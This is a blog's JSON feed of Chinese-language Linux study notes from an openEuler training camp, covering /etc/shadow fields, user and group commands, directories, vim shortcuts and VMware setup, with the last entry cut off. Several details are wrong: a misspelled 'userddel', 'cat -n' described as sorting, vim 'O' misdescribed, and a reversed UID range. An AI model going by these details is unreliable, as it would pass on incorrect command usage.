{
    "version": "https://jsonfeed.org/version/1",
    "title": "M3k0mi's blog",
    "subtitle": "",
    "icon": "http://m3k0mi.github.io/assets/favicon.ico",
    "description": "",
    "home_page_url": "http://m3k0mi.github.io",
    "items": [
        {
            "id": "http://m3k0mi.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A57/",
            "url": "http://m3k0mi.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A57/",
            "title": "基础软件训练营7",
            "date_published": "2025-10-13T11:52:45.000Z",
            "content_html": "<h3 id=\"etcshadow\"><a class=\"anchor\" href=\"#etcshadow\">#</a> /etc/shadow</h3>\n<p>用户密码文件</p>\n<p>第一行：用户名<br />\n第二行：加密密码，用户密码必须是加密的，*、！、！！都表示没有密码，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>6</mn></mrow><annotation encoding=\"application/x-tex\">6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">6</span></span></span></span>、<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>5</mn></mrow><annotation encoding=\"application/x-tex\">5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">5</span></span></span></span> 等都表示加密算法<br />\n第三行：表示上一次修改密码的日期，单位天，从 1970-1-1 开始计算 (Unix 系统诞生)<br />\n 第四行：修改密码最短期限，上一次修改到下一次修改密码的间隔，必须经过... 天才能修改<br />\n第五行：密码最长有效期，密码有效的最长时间<br />\n第六行：密码过期前的告警天数<br />\n第七行：密码的过期后还有几天能使用<br />\n第八行：账户的失效日期，单位天<br />\n第九行：空</p>\n<h3 id=\"管理用户的命令\"><a class=\"anchor\" href=\"#管理用户的命令\">#</a> 管理用户的命令</h3>\n<p>useradd 创建用户，-u 指定 uid，-g 指定 gid (必须有此 id 的组存在)，-c 指定用户描述信息，-d 指定用户的家目录，-s 指定登录 shell，-M 不要创建用户家目录，-O 允许使用重复的 uid 创建用户</p>\n<p>userdel 删除用户，仅仅删除使用户，用户对应的家目录和邮箱文件都没有删除，此时此刻，如果创建新的用户 id 和删除用户的 id 一致，新用户就会继承</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>userddel <span class=\"token parameter variable\">-r</span></pre></td></tr></table></figure><p>完整删除用户</p>\n<p>usermod 修改用户，-l 修改用户名，-u 修改 uid，-g 修改 gid，-c 修改描述信息，-d 修改用户家目录 (不会创建目录)，-m 创建用户家目录 (通常 - md 联合使用)，-L 锁定用户密码 (实际修改了 /etc/shadow 文件中加密后的密码添加了一个！)，-U 解锁，-aG 将用户添加到某个组中</p>\n<p>id 查询用户是否存在</p>\n<p>创建用户则查找文件 uid 最大的用户 + 1 做为新用户的 id</p>\n<h3 id=\"用户组的管理\"><a class=\"anchor\" href=\"#用户组的管理\">#</a> 用户组的管理</h3>\n<p>组名<br />\n组的密码占位符<br />\n组 ID<br />\n 组内的成员</p>\n<p>组之所以可以登录，是因为某些用户需要临时获得组的权限</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gpasswd</pre></td></tr></table></figure><p>创建组的密码</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>newgrp 组名</pre></td></tr></table></figure><p>登录组</p>\n<h4 id=\"etcgshadow\"><a class=\"anchor\" href=\"#etcgshadow\">#</a> /etc/gshadow</h4>\n<p>组密码存储文件</p>\n<p>组名<br />\n加密后的组密码<br />\n组的管理员<br />\n组内的成员</p>\n<h4 id=\"管理组的命令\"><a class=\"anchor\" href=\"#管理组的命令\">#</a> 管理组的命令</h4>\n<p>groupadd 创建组</p>\n<p>groupdel 删除组</p>\n<p>groupmod 修改组</p>\n<h6 id=\"gpasswd-管理组和修改密码\"><a class=\"anchor\" href=\"#gpasswd-管理组和修改密码\">#</a> gpasswd 管理组和修改密码</h6>\n<p>-a 添加用户到组</p>\n<p>-d 删除用户</p>\n<p>-r 删除组的密码</p>\n<p>-A 批量添加管理员</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gpasswd <span class=\"token parameter variable\">-M</span> user,user1</pre></td></tr></table></figure><p>一次添加多个成员</p>\n<h6 id=\"groupmems-管理组超级管理员才可以执行\"><a class=\"anchor\" href=\"#groupmems-管理组超级管理员才可以执行\">#</a> groupmems 管理组 (超级管理员才可以执行)</h6>\n<p>-g 指定组</p>\n<p>-a 指定用户</p>\n<p>-d 删除用户</p>\n<p>-p 从组中移除所有成员</p>\n<p>-l 列出组内的成员</p>\n<h6 id=\"chage\"><a class=\"anchor\" href=\"#chage\">#</a> chage</h6>\n<p>-l 列出用户的密码策略信息</p>\n<p>-W 修改密码告警天数</p>\n<p>-M 需改最长有效期</p>\n<p>-m 修改最短有效期</p>\n<p>-E 修改账户过期时间</p>\n<p>-I 修改密码锁定日期</p>\n<p>-d 必须修改的时间 (如果为 0，下一次强制修改密码)</p>\n<h4 id=\"etclogindefs\"><a class=\"anchor\" href=\"#etclogindefs\">#</a> /etc/login.defs</h4>\n<p>默认创建的用户，密码最大有效期，最小有效期，告警天数都是在这个文件中定义的</p>\n",
            "tags": [
                "ICT",
                "华为大赛暑假集训营",
                "ICT"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2025/10/11/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A56/",
            "url": "http://m3k0mi.github.io/2025/10/11/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A56/",
            "title": "基础软件训练营6",
            "date_published": "2025-10-11T07:02:21.000Z",
            "content_html": "<h3 id=\"linux目录\"><a class=\"anchor\" href=\"#linux目录\">#</a> linux 目录</h3>\n<h4 id=\"afs\"><a class=\"anchor\" href=\"#afs\">#</a> afs</h4>\n<p>空目录，作为临时文件的临时挂载使用</p>\n<h4 id=\"bash_completiond\"><a class=\"anchor\" href=\"#bash_completiond\">#</a> bash_completion.d</h4>\n<p>系统自动生成</p>\n<h4 id=\"bin\"><a class=\"anchor\" href=\"#bin\">#</a> bin</h4>\n<p>存放操作系统所有的命令，原路径 usr/bin</p>\n<h4 id=\"boot\"><a class=\"anchor\" href=\"#boot\">#</a> boot</h4>\n<p>操作系统启动引导分区目录，系统开机时加载的文件</p>\n<h4 id=\"dev\"><a class=\"anchor\" href=\"#dev\">#</a> dev</h4>\n<p>操作系统各种各样的设备文件，比如各种外接设备文件、分区文件，删除后重启依旧生成</p>\n<h4 id=\"etc\"><a class=\"anchor\" href=\"#etc\">#</a> etc</h4>\n<p>各种配置文件，系统配置和软件配置，比如主机名、网卡配置文件、防火墙配置、用户账号密码</p>\n<h4 id=\"home\"><a class=\"anchor\" href=\"#home\">#</a> home</h4>\n<p>存放普通用户的 home 目录，root 单独一个目录</p>\n<h4 id=\"lib\"><a class=\"anchor\" href=\"#lib\">#</a> lib</h4>\n<p>命令会引用的库文件</p>\n<h4 id=\"lostfound\"><a class=\"anchor\" href=\"#lostfound\">#</a> lost+found</h4>\n<p>存储电脑意外关机的数据</p>\n<h4 id=\"mediamnt\"><a class=\"anchor\" href=\"#mediamnt\">#</a> media/mnt</h4>\n<p>临时挂载使用，比如要使用光盘的文件，必须将其挂载</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mount</span> <span class=\"token punctuation\">..</span>. /media</pre></td></tr></table></figure><p>挂载到 media</p>\n<h4 id=\"opt\"><a class=\"anchor\" href=\"#opt\">#</a> opt</h4>\n<p>存放的都是用户下载的第三方文件的保存路径</p>\n<h4 id=\"proc\"><a class=\"anchor\" href=\"#proc\">#</a> proc</h4>\n<p>存放系统运行的数据，还有系统信息，文件名称都是进程 id，重启后会清空</p>\n<h4 id=\"root\"><a class=\"anchor\" href=\"#root\">#</a> root</h4>\n<p>超级管理员的 home 目录</p>\n<h4 id=\"run\"><a class=\"anchor\" href=\"#run\">#</a> run</h4>\n<p>保存系统开机时的运行数据</p>\n<h4 id=\"sbin\"><a class=\"anchor\" href=\"#sbin\">#</a> sbin</h4>\n<p>保存二进制可执行文件 -&gt; 命令，只有超级管理员可以使用</p>\n<h4 id=\"srv\"><a class=\"anchor\" href=\"#srv\">#</a> srv</h4>\n<p>空目录，一些变化的数据存储目录，比如 apache 的网页文件</p>\n<h4 id=\"sys\"><a class=\"anchor\" href=\"#sys\">#</a> sys</h4>\n<p>system，存储系统的相关配置，系统调优可能会修改</p>\n<h4 id=\"tmp\"><a class=\"anchor\" href=\"#tmp\">#</a> tmp</h4>\n<p>软件运行时的临时文件</p>\n<h4 id=\"usr\"><a class=\"anchor\" href=\"#usr\">#</a> usr</h4>\n<p>最重要，快捷方式的源文件路径<br />\n /usr/local，用户安装第三方软件的路径</p>\n<h4 id=\"var\"><a class=\"anchor\" href=\"#var\">#</a> var</h4>\n<p>程序的默认日志文件、网页文件</p>\n<h3 id=\"文件规范命名\"><a class=\"anchor\" href=\"#文件规范命名\">#</a> 文件规范命名</h3>\n<p>1. 字符不要超过 255<br />\n2. 文件名字中不要包含特殊字符</p>\n<h3 id=\"文件路径\"><a class=\"anchor\" href=\"#文件路径\">#</a> 文件路径</h3>\n<p>分为相对路径和绝对路径</p>\n<p>相对路径：只有特定的目录下才能使用<br />\n绝对路径：在系统上所有的位置都能使用</p>\n<h3 id=\"linux命令\"><a class=\"anchor\" href=\"#linux命令\">#</a> linux 命令</h3>\n<h4 id=\"cd\"><a class=\"anchor\" href=\"#cd\">#</a> cd</h4>\n<p>进入某个文件夹、目录</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /</pre></td></tr></table></figure><p>进入根目录</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> -</pre></td></tr></table></figure><p>回到上次所在的目录</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> ~</pre></td></tr></table></figure><p>快速回到当前用户所在的家目录</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> ~username</pre></td></tr></table></figure><p>快速回到某一用户的家目录</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> <span class=\"token punctuation\">..</span></pre></td></tr></table></figure><p>回到上一级目录</p>\n<h4 id=\"ls\"><a class=\"anchor\" href=\"#ls\">#</a> ls</h4>\n<p>列出文件或目录</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span></pre></td></tr></table></figure><p>列出当前，目录下的目录或文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> /</pre></td></tr></table></figure><p>列出根目录下的内容</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> / <span class=\"token parameter variable\">-l</span></pre></td></tr></table></figure><p>查看根目录内容及详细信息</p>\n<p>文件类型</p>\n<p>- 普通文件<br />\n d 目录文件<br />\n b 块文件<br />\n c 字符设备 外接设备 键盘鼠标<br />\n l 链接文件，符号链接，快捷方式<br />\n s 套接字文件，系统程序之间的通信可以通过套接字文件通信</p>\n<p>文件权限</p>\n<p>r 可读<br />\n w 可写<br />\n x 可执行</p>\n<p>三个分别为人、组、其他人的权限</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-lh</span></pre></td></tr></table></figure><p>将文件的大小进行换算</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-a</span></pre></td></tr></table></figure><p>显示隐藏文件，. 开头的为隐藏文件</p>\n<p>每个目录下都有。和..，. 为当前目录，.. 为上一级目录</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-d</span></pre></td></tr></table></figure><p>列出目录本身</p>\n<h4 id=\"pwd\"><a class=\"anchor\" href=\"#pwd\">#</a> pwd</h4>\n<p>打印当前，目录</p>\n<h4 id=\"passwd\"><a class=\"anchor\" href=\"#passwd\">#</a> passwd</h4>\n<p>修改用户密码</p>\n<p>管理员 -&gt; 修改任何用户密码，不需要验证密码，不用遵循密码策略</p>\n<p>普通用户 -&gt; 只能修改自己的密码，且需要验证密码，且要遵循密码策略</p>\n<h4 id=\"cat\"><a class=\"anchor\" href=\"#cat\">#</a> cat</h4>\n<p>打印文件内容</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> <span class=\"token parameter variable\">-n</span></pre></td></tr></table></figure><p>并排序</p>\n<h4 id=\"touchmkdir\"><a class=\"anchor\" href=\"#touchmkdir\">#</a> touch/mkdir</h4>\n<p>创建文件 / 目录</p>\n<p>touch：创建空文件、更新文件 / 目录的时间戳</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> <span class=\"token parameter variable\">-p</span></pre></td></tr></table></figure><p>递归创建，将没有的目录一并创建</p>\n<h4 id=\"cp\"><a class=\"anchor\" href=\"#cp\">#</a> cp</h4>\n<p>拷贝文件及目录</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cp</span> -r/-a 路径 <span class=\"token builtin class-name\">.</span></pre></td></tr></table></figure><p>拷贝一整个目录，. 处可以改，表示拷贝并重命名</p>\n<h4 id=\"mv\"><a class=\"anchor\" href=\"#mv\">#</a> mv</h4>\n<p>移动和重命名</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mv</span> 路径 文件名</pre></td></tr></table></figure><h4 id=\"rm\"><a class=\"anchor\" href=\"#rm\">#</a> rm</h4>\n<p>删除文件</p>\n<p>rm 删除目录要将文件全部删除</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">rm</span> <span class=\"token parameter variable\">-rf</span></pre></td></tr></table></figure><p>将目录下的文件一并删完</p>\n<h3 id=\"vim\"><a class=\"anchor\" href=\"#vim\">#</a> vim</h3>\n<p>文本编辑器</p>\n<p>查看文件、编辑文件、保存文件</p>\n<h4 id=\"vim的三大模式\"><a class=\"anchor\" href=\"#vim的三大模式\">#</a> vim 的三大模式</h4>\n<p>命令模式：可以实现简单的复制、粘贴、删除内容以及跳转</p>\n<p>编辑模式 /’插入模式：编辑文本的内容，增删改</p>\n<p>退出模式 / 末行模式：保存文件、另存为文件</p>\n<p>三大模式之间的切换：默认打开的是默认模式<br />\n编辑模式和退出模式无法直接切换，中间必须要经过命令模式<br />\n编辑模式 -&gt; 命令模式 -&gt; 退出模式<br />\n退出模式 -&gt; 命令模式 -&gt; 编辑模式</p>\n<h4 id=\"vim快捷方式\"><a class=\"anchor\" href=\"#vim快捷方式\">#</a> vim 快捷方式</h4>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">快捷键</th>\n<th style=\"text-align:center\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">i</td>\n<td style=\"text-align:center\">在光标所在处切换到编辑模式</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">a</td>\n<td style=\"text-align:center\">在光标后面一个字符切换到编辑模式</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">o</td>\n<td style=\"text-align:center\">在光标所在行的下一行切换到编辑模式</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">I</td>\n<td style=\"text-align:center\">在光标所在行的最前面切换到编辑模式</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">A</td>\n<td style=\"text-align:center\">在光标所在行的最后面切换到编辑模式</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">O</td>\n<td style=\"text-align:center\">在光标所在行的最前面切换到编辑模式</td>\n</tr>\n</tbody>\n</table>\n<p>从命令模式切换到退出模式：':'</p>\n<p>从退出模式 / 插入模式切换到命令模式：‘ESC’</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">快捷键</th>\n<th style=\"text-align:center\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">yy</td>\n<td style=\"text-align:center\">复制当前光标所在的行</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">p</td>\n<td style=\"text-align:center\">在光标下面一行进行粘贴</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">P</td>\n<td style=\"text-align:center\">在光标上面一行进行粘贴</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">dd</td>\n<td style=\"text-align:center\">删除光标所在行一整行内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">dG</td>\n<td style=\"text-align:center\">删除光标所在行以及后面所有的内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">nG (n 表示数字)</td>\n<td style=\"text-align:center\">跳转到第 n 行内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">G</td>\n<td style=\"text-align:center\">跳转到文件的最后一行</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">gg</td>\n<td style=\"text-align:center\">跳转到文件的第一行</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">x</td>\n<td style=\"text-align:center\">删除光标所在处单个字符</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">u</td>\n<td style=\"text-align:center\">撤销上一次的操作</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>退出模式下常见的快捷方式</strong></td>\n<td style=\"text-align:center\"><strong>描述</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">:set number</td>\n<td style=\"text-align:center\">显示文件每一行的行号</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">:n (n 是数字)</td>\n<td style=\"text-align:center\">直接跳转到第 n 行</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">:w  文件路径</td>\n<td style=\"text-align:center\">将当前文件另存为</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">:%d</td>\n<td style=\"text-align:center\">清空当前文件的所有内容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">😒/ 关键字 / 替换后的关键字 /g</td>\n<td style=\"text-align:center\">替换当前光标所在行的所有关键字 (默认不加 g 则是替换第一个匹配到的关键字)</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">:$s / 关键字 / 替换后的关键字 /g</td>\n<td style=\"text-align:center\">替换文件中所有的关键字</td>\n</tr>\n</tbody>\n</table>\n<p>在命令模式下：输入 '/ 关键字 ' 可以匹配关键字，通过小写 n 来进行下一个关键字的跳转。大写的 N 表示跳转到上一个关键字</p>\n<h3 id=\"用户管理和权限管理\"><a class=\"anchor\" href=\"#用户管理和权限管理\">#</a> 用户管理和权限管理</h3>\n<h4 id=\"用户管理\"><a class=\"anchor\" href=\"#用户管理\">#</a> 用户管理</h4>\n<p>用户的作用：</p>\n<p>1. 通过用户登录系统获得操作环境<br />\n 2. 用户可以来运行软件，所有的软件都需要用户来运行</p>\n<p>系统根据用户 id 来识别的<br />\n管理员是根据用户名来识别用户的</p>\n<p>系统超级管理员：UID 为 0 的用户就是系统的超级管理员<br />\n系统用户：0&lt;UID&lt;1000, 这些用户一般不可以登录到操作系统，用来专门运行各种软件和程序<br />\n普通用户:&lt;=1000UID，这些用户都是超级管理员创建</p>\n<p>用户组：多个用户的集合，每个用户必须要属于某一个组</p>\n<p>分类：<br />\n1. 私有组 (属组)：用户自己的用户组，创建用户的同时也会创建一个同名的私有组<br />\n 2. 附加组 (公共组)：用户可以加入到其他组中，目的是为了获得对应组的权限</p>\n<h4 id=\"etcpasswd用户信息文件\"><a class=\"anchor\" href=\"#etcpasswd用户信息文件\">#</a> /etc/passwd 用户信息文件</h4>\n<p>用户名和 UID 的对应关系保存在该文件中</p>\n<pre><code>root:x:0:0:root:/root:/bin/bash\n</code></pre>\n<p>第一列：用户名<br />\n第二列：密码占位符，x 表示这个用户登录时需要密码验证，没有 x 则表示不需要<br />\n第三列：表示用户的 id<br />\n 第四列：表示拥有组的 id<br />\n 第五列：用户的描述信息，没有实际意义<br />\n第六列：用户的家目录<br />\n第七列：登录用户第一个执行的程序，/bin/bash 表示用户可以登录，可以获取到对应的执行环境，/sbin/nologin 表示用户不可以登录，系统用户大多数都是这个登录 shell</p>\n",
            "tags": [
                "ICT",
                "华为大赛暑假集训营",
                "ICT"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2025/10/10/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A55/",
            "url": "http://m3k0mi.github.io/2025/10/10/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A55/",
            "title": "基础软件训练营5",
            "date_published": "2025-10-10T03:06:05.000Z",
            "content_html": "<h3 id=\"vmware\"><a class=\"anchor\" href=\"#vmware\">#</a> VMware</h3>\n<h4 id=\"硬件兼容性\"><a class=\"anchor\" href=\"#硬件兼容性\">#</a> 硬件兼容性</h4>\n<p>相当于在购买电脑时的主板配置，即主板最多支持多大的内存和硬盘以及 CPU</p>\n<h4 id=\"安装操作系统\"><a class=\"anchor\" href=\"#安装操作系统\">#</a> 安装操作系统</h4>\n<p>安装程序光盘映像文件，VMware 将自动安装操作系统，一般选稍后安装</p>\n<h4 id=\"选择客户机操作系统\"><a class=\"anchor\" href=\"#选择客户机操作系统\">#</a> 选择客户机操作系统</h4>\n<p>根据选择项，来模拟适合该系统的硬件，openEuler 选择‘其他 Linuux5.x 内核 64 位’</p>\n<h4 id=\"处理器配置\"><a class=\"anchor\" href=\"#处理器配置\">#</a> 处理器配置</h4>\n<p>数量指主板上 CPU 插槽，可以装多少块物理 CPU。每个处理器内核数指一个 CPU 多少核心</p>\n<h4 id=\"内存\"><a class=\"anchor\" href=\"#内存\">#</a> 内存</h4>\n<p>内存分配建议 4G 以上，能完整流畅运行图形化</p>\n<h4 id=\"网络模式\"><a class=\"anchor\" href=\"#网络模式\">#</a> 网络模式</h4>\n<p>可以上网：桥接、NAT</p>\n<p>不上网：仅主机</p>\n<p>不创网卡：不使用网络连接</p>\n<h4 id=\"io控制器\"><a class=\"anchor\" href=\"#io控制器\">#</a> I/O 控制器</h4>\n<p>硬盘上的 IO 控制器，能更好的提升读写效率，通常服务器选择 lsi logic</p>\n<h4 id=\"硬盘类型\"><a class=\"anchor\" href=\"#硬盘类型\">#</a> 硬盘类型</h4>\n<p>IDE-&gt; 并口硬盘 体型大容量小</p>\n<p>scsi/sata 硬盘 -&gt; 串口硬盘 scsi 用在服务器，sata 用在 PC</p>\n<p>NVME 固态卡 -&gt; 通常所说的 m.2 固态硬盘</p>\n<h3 id=\"命令\"><a class=\"anchor\" href=\"#命令\">#</a> 命令</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>systemctl <span class=\"token builtin class-name\">enable</span> <span class=\"token parameter variable\">--now</span> cockpit.socket</pre></td></tr></table></figure><p>开启 cockpit 的 web 控制台，--now 表示当前立即启动</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>systemctl disable <span class=\"token parameter variable\">--now</span> firewalld.service</pre></td></tr></table></figure><p>关闭防火墙</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ifconfig</span></pre></td></tr></table></figure><p>查寻 ip 地址</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">https</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//ip地址:9090</span></span></pre></td></tr></table></figure><p>访问</p>\n<h3 id=\"ukui\"><a class=\"anchor\" href=\"#ukui\">#</a> ukui</h3>\n<p>来自麒麟的桌面应用</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>yum <span class=\"token function\">install</span> ukui</pre></td></tr></table></figure><p>安装 ukui 的包</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>systemctl set-default graphical.target</pre></td></tr></table></figure><p>设置图形化启动</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">reboot</span></pre></td></tr></table></figure><p>重启</p>\n",
            "tags": [
                "ICT",
                "华为大赛暑假集训营",
                "ICT"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2025/10/09/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A54/",
            "url": "http://m3k0mi.github.io/2025/10/09/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A54/",
            "title": "基础软件训练营4",
            "date_published": "2025-10-09T08:08:31.000Z",
            "content_html": "<h3 id=\"openeuler\"><a class=\"anchor\" href=\"#openeuler\">#</a> openEuler</h3>\n<h4 id=\"开源协议\"><a class=\"anchor\" href=\"#开源协议\">#</a> 开源协议</h4>\n<p>openEuler mulan（木兰宽松许可证）强制开源协议<br />\n CentOS GPL 协议开源 强制开源协议<br />\n MIT 麻省理工开源协议 商用领域最好的协议<br />\n apache liscense apache 基金会的开源协议</p>\n<p>在国内最大的区别在于：A. 由社区驱动（开放原子基金会）B. 完全开源免费</p>\n<p>openEuler 和 CentOs 没有从属关系，都是基于上游的 kernel 来进行构建的</p>\n<p>openEuler 和 CentOS 很多命令一样，原因在于都是基于 RPM 包来构建的软件包，openEuler 使用了红帽开源的 RPM 包管理器，可以兼容 RPM 的软件包</p>\n<h4 id=\"openeuler的发行版本\"><a class=\"anchor\" href=\"#openeuler的发行版本\">#</a> openEuler 的发行版本</h4>\n<p>从 2019 年底开源至今，仅有 3 个版本可以在生产环境使用，但是发布版本不只两个。<br />\n第一个稳定版本 (LTS)：openEuler 20.03 LTS<br />\n 每 2 年发布一个长期支持版 openEuler 22.03 LTS、openEuler 24.03 LTS</p>\n<p>sp: 操作系统服务包 sp1、sp2、sp3、sp4，通常下载最新的版本，服务包指操作系统在一段时间内对软件的 bug 和系统补丁做一个修复集合，用来进行推送更新</p>\n<p>目前推荐 22.03 LTS sp4</p>\n<p>社区发行版：是 openEuler 社区自主发行的原生版本<br />\n商业发行版：是商业公司二次开发的版本</p>\n<h4 id=\"架构cpu类型\"><a class=\"anchor\" href=\"#架构cpu类型\">#</a> 架构 (CPU 类型)</h4>\n<p>复杂型指令集：x86_64 主要是因特尔和 AMD 的 CPU (openEuler 没有 32 位操作系统)<br />\n 精简型指令集：aarchx64 主要是 ARM 的处理器，比如 kunpeng916</p>\n<h4 id=\"场景\"><a class=\"anchor\" href=\"#场景\">#</a> 场景</h4>\n<p>服务器：裸机 (服务器)、虚拟机<br />\n边缘计算：智能设备来进行优化后的安装包，也就是携带特定使用场景的软件<br />\n云计算：已经安装好操作系统模板的虚拟机镜像文件 (KVM 的 qcow2 模板)</p>\n<p>Offline Standard ISO 离线安装标准的 ISO (标准的离线包，也就是仅携带一些必要的系统软件)</p>\n<p>Offine Everything ISO 离线安装的完整 ISO (携带了操作系统所有产商开发的软件，完整的离线包)</p>\n<p>Network Install ISO 网络安装的 ISO, 该 ISO 文件仅能启动操作系统，不能进行安装，因为没有携带安装系统所必须的文件，所有安装系统用到的文件必须通过网络进行下载，因此如果服务器可以联网，则可以使用该安装项，否则不能使用</p>\n",
            "tags": [
                "ICT",
                "华为大赛暑假集训营",
                "ICT"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2025/09/29/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A52/",
            "url": "http://m3k0mi.github.io/2025/09/29/%E5%9F%BA%E7%A1%80%E8%BD%AF%E4%BB%B6%E8%AE%AD%E7%BB%83%E8%90%A52/",
            "title": "基础软件训练营2",
